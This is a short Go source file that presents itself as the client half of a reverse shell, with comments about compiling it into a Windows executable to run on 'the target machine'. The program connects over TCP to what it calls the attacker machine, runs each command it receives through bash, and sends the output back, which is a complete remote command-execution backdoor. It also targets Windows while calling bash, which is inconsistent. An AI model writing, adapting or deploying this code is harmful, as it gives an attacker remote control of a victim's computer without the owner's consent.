// This is the script we want to convert into exe to runs on the target machine
// windows	386   (32 bit machine)
// windows	amd64 (64 bit machine)

//run the command below to generate an exe based on windows 64 bit machine
/***************************************************
  env GOOS=windows GOARCH=amd64 go build client.go *
****************************************************/
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	//Going to connected to the attacker machine ( ip addr same as servers)
	conn, _ := net.Dial("tcp", ":8081")
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		//Executing the command from the server
		cmd, _ := exec.Command("bash", "-c", message).CombinedOutput()
		fmt.Println(string(cmd))
		//sending back the result to server
		conn.Write([]byte(cmd))

	}
}
